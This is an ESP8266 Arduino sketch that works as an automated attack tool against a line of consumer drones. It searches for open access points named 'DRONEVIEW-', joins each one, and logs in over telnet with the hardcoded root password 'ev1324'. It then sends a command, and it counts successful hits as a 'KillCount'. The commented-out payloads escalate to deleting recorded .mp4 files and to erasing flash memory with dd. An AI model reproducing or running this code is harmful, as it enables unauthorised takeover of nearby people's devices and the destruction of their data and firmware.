/*INCLUDES*/
#include <ESP8266WiFi.h>
#include <WiFiClient.h>

/*GLOBAL CONSTANTS*/
static const char * const AP_PREFIX = "DRONEVIEW-";
IPAddress TELNET_IP(192,168,234,1);
static const uint16_t TELNET_PORT = 23;
static const char * const TELNET_USERNAME = "root";
static const char * const TELNET_PASSWORD = "ev1324";
//Various levels of meanness
static const char * const TELNET_COMMAND = "uname -a";
//static const char * const TELNET_COMMAND = "find /bin/vslocal/sd -name '*.mp4'"
//static const char * const TELNET_COMMAND = "find /bin/vslocal/sd -name '*.mp4' -exec rm {} \;"
//static const char * const TELNET_COMMAND = "dd if=/dev/zero of=/dev/mtdblock0";


/*GLOBAL BUFFERS*/

void setup() {
  //This is because the ESP8266 bootloader runs at this baud, and because I'm lazy.
  //Leaving it here lets me see the bootloader startup, followed by my console output.
  Serial.begin(74880); 

  // Set WiFi to station mode and disconnect from an AP if it was previously connected
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  while (!Serial);             // Leonardo: wait for serial monitor
  Serial.println("Setup done");
}

//Wait up to maxdelay for the client to become available. If not, return. If so, also wait plusdelay
static void delay_max_plus(WiFiClient & client, unsigned maxdelay, unsigned plusdelay )
{
  while(maxdelay && !client.available() )
  {
    maxdelay--;
    delay(1);
  }
  
  if(maxdelay)
  {
    delay(plusdelay);
  }
}

static void print_tcp_data(WiFiClient & client)
{
  while(client.available())
  {
    Serial.print(client.readStringUntil('\r'));
  }
}

static void send_and_print(WiFiClient & client, const char * str, bool carriage_return )
{
  client.print(str);
  if( carriage_return )
  {
    client.print("\r");
  }
  delay_max_plus(client,50,10);
  print_tcp_data(client);
}

static unsigned dronepwn( void )
{
  unsigned retn = 0;
  // WiFi.scanNetworks will return the number of networks found
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i)
  {
    /*At this point, we only want open APs*/
    if( WiFi.encryptionType(i) != ENC_TYPE_NONE )
    {
      Serial.print("Skipping(encrypted):");
      Serial.println(WiFi.SSID(i));
      continue;
    }

    /*specifically that start with the prefix*/
    if( strncmp(WiFi.SSID(i).c_str(), AP_PREFIX, strlen(AP_PREFIX)) )
    {
      Serial.print("Skipping(does not start with ");
      Serial.print(AP_PREFIX);
      Serial.print("):");
      Serial.println(WiFi.SSID(i));
      continue;
    }

    // We start by connecting to a WiFi network
    Serial.print("Connecting to ");
    Serial.print(WiFi.SSID(i));
    Serial.println("");
    WiFi.begin(WiFi.SSID(i).c_str(), "" );

    wl_status_t stat = WiFi.status();
    while ( stat != WL_CONNECTED && stat != WL_CONNECT_FAILED && stat != WL_CONNECT_FAILED && stat != WL_NO_SSID_AVAIL )
      {
      delay(1);
      stat = WiFi.status();
      }
    if( stat != WL_CONNECTED )
      {
      Serial.print("Failed to connect(");
      Serial.print(WiFi.SSID(i));
      Serial.println(")");
      WiFi.disconnect();
      continue;
      }

    Serial.print("Connected(");
    Serial.print(WiFi.localIP());
    Serial.println(")!");

    WiFiClient telnet;
    if ( telnet.connect(TELNET_IP, TELNET_PORT) )
    {
      Serial.println("Telnet connection success!");
      send_and_print(telnet,"",false);//Print Banner
      send_and_print(telnet,TELNET_USERNAME,true);
      send_and_print(telnet,TELNET_PASSWORD,true);
      send_and_print(telnet,TELNET_COMMAND,true);
      retn ++;
    }
    else
    {
      Serial.println("Telnet connection failed!");
    }
    WiFi.disconnect();
  }
  return retn;
}

void loop()
{
unsigned killcount = 0;
while( true )
  {
    unsigned old_killcount = killcount;
    killcount += dronepwn();
    if( old_killcount != killcount )
    {
      Serial.print("KillCount:");
      Serial.println(killcount);
    }
  }
}


